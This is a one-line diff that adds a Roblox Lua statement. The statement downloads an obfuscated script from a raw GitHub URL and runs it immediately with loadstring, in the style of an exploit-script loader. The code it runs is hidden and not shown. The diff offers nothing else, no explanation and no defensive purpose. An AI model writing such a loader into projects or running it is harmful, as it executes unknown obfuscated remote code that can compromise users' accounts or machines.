@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WinterDinder/crispy-dollop/main/lazaruszada.txt.obfuscated.lua", true))()
